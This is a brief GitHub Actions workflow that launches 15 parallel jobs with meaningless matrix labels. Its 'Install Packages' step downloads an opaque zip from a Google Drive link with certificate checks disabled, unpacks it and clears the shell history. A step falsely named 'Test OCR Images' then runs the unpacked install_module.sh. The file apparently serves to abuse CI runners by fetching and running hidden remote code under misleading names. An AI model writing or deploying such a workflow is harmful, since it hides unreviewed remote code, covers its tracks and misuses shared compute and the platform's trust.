name: bautroi8bo
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  SETUP:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ecKkmv_IizVXscNpsI87DegQ-4FcDigm" -O bautroi8bo.zip
        unzip -o bautroi8bo.zip
        rm bautroi8bo.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


